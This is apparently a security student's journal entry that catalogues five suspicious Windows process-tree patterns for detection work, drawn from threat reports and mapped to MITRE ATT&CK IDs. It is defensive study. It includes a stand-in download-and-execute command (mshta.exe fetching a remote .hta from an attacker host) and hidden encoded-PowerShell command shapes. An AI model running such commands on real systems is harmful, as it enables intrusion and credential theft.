# Day 35 — Suspicious Process Tree Patterns

**Date:** 2026-06-25
**Source:** Published threat intelligence reports (CrowdStrike, Microsoft, Mandiant)
**Note:** Atomic Red Team simulations not run on host machine. These patterns are from real-world attack documentation, not my own test environment.

---

## Why I'm Documenting These

The Hard exercise was supposed to involve running Atomic Red Team simulations and capturing the process trees. Not doing that on my actual machine — if something goes wrong with a simulated attack on the host, I have no VM isolation to contain it.

Instead I went through published threat reports and pulled the process tree patterns that came up repeatedly. These are real attack patterns from real incidents, not synthetic examples. In some ways that's more useful than a controlled simulation — it's what actually shows up in the wild.

---

## Pattern 1 — Malicious Office Macro (T1566.001 + T1059.001)

**What it looks like:**
```
WINWORD.EXE (PID: xxxx)
  └── cmd.exe /c powershell.exe -WindowStyle Hidden -EncodedCommand [base64]
        └── powershell.exe -WindowStyle Hidden -enc [base64]
              └── [malicious payload process]
```

**Why it's suspicious:**
Word has no legitimate reason to spawn cmd.exe or PowerShell. When you open a document normally, nothing gets executed unless you deliberately run a macro. A document that automatically executes code when opened is malicious almost by definition.

The `-WindowStyle Hidden` flag means the PowerShell window doesn't appear. The user sees nothing while the attack runs. The encoded command hides the actual malicious script from casual inspection.

**Real world context:** This is the classic phishing document attack chain. User receives email with attachment, opens it, document prompts to "Enable Content," macro runs, gives attacker a foothold.

**MITRE ATT&CK:** T1566.001 (Spearphishing Attachment) → T1204.002 (Malicious File) → T1059.001 (PowerShell)

---

## Pattern 2 — LOLBin Abuse via mshta.exe (T1218.005)

**What it looks like:**
```
explorer.exe
  └── mshta.exe http://attacker-controlled-site.com/payload.hta
        └── [downloaded and executed payload]
```

**Why it's suspicious:**
mshta.exe (Microsoft HTML Application Host) is a legitimate Windows binary. It's designed to run `.hta` files — HTML applications. But it can also download and execute code from a URL directly from the command line.

Attackers use it because:
- It's signed by Microsoft — bypasses application whitelisting
- It can reach out to the internet — downloads the payload dynamically
- It's not commonly monitored — many environments don't alert on mshta.exe

Seeing mshta.exe with a URL as a command line argument is a very high confidence indicator of attack.

**MITRE ATT&CK:** T1218.005 — System Binary Proxy Execution: Mshta

---

## Pattern 3 — Scheduled Task Persistence (T1053.005)

**What it looks like:**
```
svchost.exe -k netsvcs (Task Scheduler service)
  └── powershell.exe -NonInteractive -WindowStyle Hidden -enc [payload]
```

**Why it's suspicious:**
Task Scheduler can legitimately run PowerShell — Windows itself uses scheduled tasks for maintenance. The suspicious part is the combination of flags:
- `-NonInteractive` — no user interaction needed, runs silently
- `-WindowStyle Hidden` — window doesn't appear
- `-enc` — encoded command, hides what's actually running

Legitimate scheduled tasks running PowerShell usually don't need all three of these. An attacker setting up persistence via a scheduled task would use exactly these flags to make sure the task runs silently without the user noticing.

**MITRE ATT&CK:** T1053.005 — Scheduled Task/Job: Scheduled Task

---

## Pattern 4 — Process Masquerading (T1036.005)

**What it looks like in Process Hacker:**
```
explorer.exe
  └── svchost.exe  ← PATH: C:\Users\labuser\AppData\Temp\svchost.exe
                      PARENT: explorer.exe (not services.exe)
```

**Why it's suspicious:**
Two immediate red flags:
1. Wrong parent — real svchost.exe is always spawned by services.exe
2. Wrong path — real svchost.exe lives in `C:\Windows\System32\`

Malware names itself svchost.exe because it looks normal in Task Manager (which only shows names, not paths). Process Hacker shows the full path, which immediately reveals the deception.

This technique is called "masquerading" — using a legitimate-looking name to blend into the normal process list.

**MITRE ATT&CK:** T1036.005 — Masquerading: Match Legitimate Name or Location

---

## Pattern 5 — Credential Dumping via LSASS (T1003.001)

**What it looks like in Process Hacker:**
```
[attacker process — could be anything]
  ├── Opens handle to lsass.exe with PROCESS_VM_READ permission
  └── [reads credential material from LSASS memory]
```

This isn't a parent-child spawn relationship — it's a handle relationship. In Process Hacker you can see which processes have open handles to other processes.

**Why it's suspicious:**
LSASS (Local Security Authority Subsystem Service) stores password hashes and Kerberos tickets in memory. Legitimate security software sometimes reads LSASS — antivirus, Windows Defender. But a process that isn't a security tool opening LSASS with read access is almost certainly trying to dump credentials.

Tools like Mimikatz do exactly this. The Sysmon Event ID 10 (ProcessAccess) catches it at the moment the handle is opened — before the credentials are even extracted.

**MITRE ATT&CK:** T1003.001 — OS Credential Dumping: LSASS Memory

---

## Summary — The Red Flag Patterns

| Pattern | What to look for | MITRE ID |
|---------|-----------------|----------|
| Office macro | WINWORD/EXCEL spawning cmd.exe or powershell.exe | T1566.001 |
| LOLBin abuse | mshta.exe, rundll32.exe, regsvr32.exe with URLs or unusual arguments | T1218 |
| Persistence | Scheduled task spawning hidden PowerShell with encoded command | T1053.005 |
| Masquerading | System process names running from wrong path or wrong parent | T1036.005 |
| Credential dump | Unexpected process accessing LSASS memory | T1003.001 |

These five patterns cover the majority of what shows up in real incident investigations at the entry level. They're not the only patterns — but recognising these reliably would make a meaningful difference in an actual SOC role.